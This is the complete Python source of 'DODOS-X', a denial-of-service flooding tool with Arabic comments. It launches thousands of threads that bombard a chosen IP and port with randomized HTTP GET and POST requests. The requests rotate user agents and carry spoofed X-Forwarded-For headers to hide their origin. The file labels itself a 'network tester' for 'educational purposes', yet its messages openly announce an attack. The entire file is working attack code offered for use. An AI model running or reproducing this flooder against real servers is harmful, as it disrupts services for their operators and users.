
import socket
import threading
import time
import sys
import random
import string
import queue
import logging
from datetime import datetime
from optparse import OptionParser

# ========== CONFIGURATION ==========
host = ""           # Target IP address
port = 7000         # Default port
thr = 10000         # Number of threads
duration = 60       # Attack duration in seconds
already_connected = 0
stop_attack = False
q = queue.Queue()
w = queue.Queue()
data = ""           # Headers data
uagent = []         # User Agents list
# ====================================

# ألوان للطباعة
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def usage():
    """عرض طريقة الاستخدام"""
    print(f"""
{Colors.RED}{Colors.BOLD}DODOS-X - Advanced Network Tester{Colors.END}

{Colors.CYAN}Usage:{Colors.END}
  python3 dodos.py -s <server_ip> [-p <port>] [-t <threads>] [-q]

{Colors.CYAN}Options:{Colors.END}
  -s, --server     Target server IP address (required)
  -p, --port       Target port (default: 7000)
  -t, --turbo      Number of threads (default: 10000)
  -q, --quiet      Quiet mode (less output)
  -h, --help       Show this help message

{Colors.CYAN}Examples:{Colors.END}
  python3 dodos.py -s 192.168.1.100
  python3 dodos.py -s 10.0.0.1 -p 80 -t 5000
  python3 dodos.py -s 127.0.0.1 -p 8080 -t 20000 -q

{Colors.YELLOW}⚠️  For Educational Purposes Only!{Colors.END}
    """)
    sys.exit(1)

def get_parameters():
    """الحصول على المعاملات من سطر الأوامر"""
    global host, port, thr, data
    
    optp = OptionParser(add_help_option=False, epilog="DODOS-X Network Tester")
    
    optp.add_option("-q", "--quiet", 
                   help="set logging to ERROR", 
                   action="store_const", 
                   dest="loglevel", 
                   const=logging.ERROR, 
                   default=logging.INFO)
    
    optp.add_option("-s", "--server", 
                   dest="host", 
                   help="attack to server ip -s ip")
    
    optp.add_option("-p", "--port", 
                   type="int", 
                   dest="port", 
                   help="-p 80 default 80")
    
    optp.add_option("-t", "--turbo", 
                   type="int", 
                   dest="turbo", 
                   help="default 10000 -t 10000")
    
    optp.add_option("-h", "--help", 
                   dest="help", 
                   action='store_true', 
                   help="show this help message")
    
    opts, args = optp.parse_args()
    
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    
    if opts.help:
        usage()
    
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    
    if opts.port is None:
        port = 7000
    else:
        port = opts.port
    
    if opts.turbo is None:
        thr = 10000
    else:
        thr = opts.turbo

def user_agent():
    """تعبئة قائمة الـ User Agents"""
    global uagent
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    return uagent

def my_bots():
    """وظيفة إضافية (يمكن تخصيصها)"""
    pass

def generate_post_data():
    """توليد بيانات POST عشوائية"""
    post_types = [
        f'{{"username":"user{random.randint(1000,9999)}","password":"pass{random.randint(1000,9999)}"}}',
        f'{{"email":"user{random.randint(1000,9999)}@test.com","action":"{random.choice(["login","register"])}"}}',
        f'{{"id":{random.randint(1,9999)},"data":"{''.join(random.choices(string.ascii_letters, k=10))}"}}',
        f'{{"token":"{random.randint(100000,999999)}","refresh":true}}',
        f'{{"command":"{random.choice(["ls","pwd","whoami"])}"}}',
        f'{{"file":"{random.choice(["config.py","main.py","data.json"])}"}}'
    ]
    return random.choice(post_types)

def generate_random_path():
    """توليد مسار عشوائي"""
    paths = [
        "/api/login", "/api/register", "/api/users", "/api/posts",
        "/api/data", "/api/v1/users", "/api/v2/posts", "/api/auth",
        "/api/token", "/api/submit", "/api/upload", "/api/process"
    ]
    return random.choice(paths)

def down_it(item):
    """دالة الهجوم الرئيسية مع عرض POST"""
    global already_connected
    
    try:
        while not stop_attack:
            try:
                # اختيار نوع الطلب
                method = random.choice(['GET', 'POST', 'GET', 'GET'])
                
                # اختيار User Agent
                current_ua = random.choice(uagent) if uagent else "Mozilla/5.0"
                
                # بناء الطلب حسب النوع
                random_path = generate_random_path()
                
                if method == 'GET':
                    # طلب GET
                    packet = f"GET {random_path}?rand={random.randint(1000,9999)} HTTP/1.1\r\n"
                    packet += f"Host: {host}\r\n"
                    packet += f"User-Agent: {current_ua}\r\n"
                    packet += "Accept: text/html,application/xhtml+xml\r\n"
                    packet += "Accept-Language: en-US,en;q=0.9\r\n"
                    packet += "Accept-Encoding: gzip, deflate\r\n"
                    packet += "Connection: keep-alive\r\n"
                    packet += "Cache-Control: no-cache\r\n"
                    packet += "Pragma: no-cache\r\n"
                    packet += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    packet += data  # إضافة الهيدرات من الملف
                    packet += "\r\n"
                else:
                    # طلب POST
                    post_data = generate_post_data()
                    content_length = len(post_data)
                    
                    packet = f"POST {random_path} HTTP/1.1\r\n"
                    packet += f"Host: {host}\r\n"
                    packet += f"User-Agent: {current_ua}\r\n"
                    packet += "Accept: application/json, text/plain, */*\r\n"
                    packet += "Accept-Language: en-US,en;q=0.9\r\n"
                    packet += "Accept-Encoding: gzip, deflate\r\n"
                    packet += "Content-Type: application/json\r\n"
                    packet += f"Content-Length: {content_length}\r\n"
                    packet += "Connection: keep-alive\r\n"
                    packet += "Cache-Control: no-cache\r\n"
                    packet += "Pragma: no-cache\r\n"
                    packet += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    packet += data  # إضافة الهيدرات من الملف
                    packet += "\r\n"
                    packet += post_data
                
                # إنشاء socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                # الاتصال وإرسال
                s.connect((host, int(port)))
                
                if s.send(packet.encode('utf-8')):
                    try:
                        s.shutdown(socket.SHUT_RDWR)
                    except:
                        pass
                    
                    already_connected += 1
                    
                    # طباعة الرسالة (مرة كل 10 طلبات عشان ما يعلقش)
                    if already_connected % 10 == 0:
                        print(f"{Colors.GREEN}Dodos attack sent : {method}{Colors.END}")
                
                try:
                    s.close()
                except:
                    pass
                
                time.sleep(0.001)
                
            except socket.error:
                time.sleep(0.5)
            except Exception:
                time.sleep(0.1)
                
    except Exception:
        pass

def dos():
    """دالة الهجوم الأولى"""
    while not stop_attack:
        try:
            item = q.get(timeout=1)
            down_it(item)
            q.task_done()
        except queue.Empty:
            if stop_attack:
                break
            continue

def dos2():
    """دالة الهجوم الثانية"""
    while not stop_attack:
        try:
            item = w.get(timeout=1)
            down_it(item)
            w.task_done()
        except queue.Empty:
            if stop_attack:
                break
            continue

def start_attack():
    """بدء الهجوم"""
    global stop_attack, already_connected, q, w
    
    print(f"\n{Colors.CYAN}[INFO] Starting attack on {host}:{port} with {thr} threads{Colors.END}")
    print(f"{Colors.CYAN}[INFO] Press Ctrl+C to stop{Colors.END}\n")
    
    # إنشاء وتشغيل الخيوط
    for i in range(int(thr)):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()
        
        if i % 100 == 0:
            time.sleep(0.05)
    
    start_time = time.time()
    item = 0
    
    try:
        while True:
            if item > 1800:  # لمنع استهلاك الذاكرة
                item = 0
                time.sleep(0.1)
            
            item = item + 1
            q.put(item)
            w.put(item)
            
            # عرض الإحصائيات كل ثانية
            if int(time.time() - start_time) % 5 == 0:
                elapsed = time.time() - start_time
                rate = already_connected / elapsed if elapsed > 0 else 0
                print(f"{Colors.YELLOW}[STATUS] Time: {int(elapsed)}s | "
                      f"Requests: {already_connected} | "
                      f"Rate: {rate:.1f}/s{Colors.END}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Attack stopped by user{Colors.END}")
    
    finally:
        stop_attack = True
        elapsed = time.time() - start_time
        rate = already_connected / elapsed if elapsed > 0 else 0
        print(f"\n{Colors.GREEN}[INFO] Attack finished!{Colors.END}")
        print(f"{Colors.GREEN}[INFO] Total requests: {already_connected}{Colors.END}")
        print(f"{Colors.GREEN}[INFO] Average rate: {rate:.1f}/s{Colors.END}")

def read_headers():
    """قراءة الهيدرات من ملف"""
    global data
    try:
        with open("headers.txt", "r") as headers_file:
            data = headers_file.read()
        print(f"{Colors.GREEN}[INFO] Loaded headers from headers.txt{Colors.END}")
    except FileNotFoundError:
        print(f"{Colors.YELLOW}[WARN] headers.txt not found, using default headers{Colors.END}")
        data = ""

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    
    # قراءة المعاملات
    get_parameters()
    
    # قراءة الهيدرات
    read_headers()
    
    # عرض المعلومات
    print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════╗")
    print(f"║     DODOS-X Attack Started        ║")
    print(f"╚══════════════════════════════════════╝{Colors.END}")
    print(f"{Colors.CYAN}Target: {host}")
    print(f"Port: {port}")
    print(f"Threads: {thr}{Colors.END}")
    
    # التحقق من الاتصال
    print(f"\n{Colors.YELLOW}[INFO] Checking connection...{Colors.END}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        s.close()
        print(f"{Colors.GREEN}[INFO] Connection successful!{Colors.END}")
    except socket.error as e:
        print(f"{Colors.RED}[ERROR] Cannot connect to {host}:{port}{Colors.END}")
        print(f"{Colors.RED}[ERROR] {e}{Colors.END}")
        usage()
    
    # تهيئة
    print(f"{Colors.YELLOW}[INFO] Initializing...{Colors.END}")
    user_agent()
    my_bots()
    time.sleep(2)
    
    # بدء الهجوم
    start_attack()